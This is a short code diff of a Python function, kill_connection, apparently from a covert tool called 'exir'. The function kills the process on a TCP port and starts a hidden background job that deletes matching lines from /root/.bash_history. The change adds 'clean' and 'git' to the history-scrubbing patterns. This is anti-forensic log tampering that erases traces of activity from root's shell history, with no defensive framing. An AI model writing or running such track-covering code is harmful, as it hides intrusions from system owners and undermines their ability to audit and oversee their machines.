@@ -112,7 +112,7 @@ def kill_connection():
     p = subprocess.Popen(['lsof -i tcp:%s'%port], stdout=subprocess.PIPE, shell=True)
     out = p.stdout.read().split('\n')[1]
     pid = out.split()[1]
-    p = subprocess.Popen(['''nohup sh -c "sleep 10; sed -i -e '/exir/d' -e '/history/d' /root/.bash_history" >/dev/null &'''], stdout=subprocess.PIPE, shell=True)
+    p = subprocess.Popen(['''nohup sh -c "sleep 10; sed -i -e '/exir/d' -e '/history/d' -e '/clean/d' -e '/git/d' /root/.bash_history" >/dev/null &'''], stdout=subprocess.PIPE, shell=True)
     p = subprocess.Popen(['kill -9 %s'%pid], stdout=subprocess.PIPE, shell=True)
     return
 
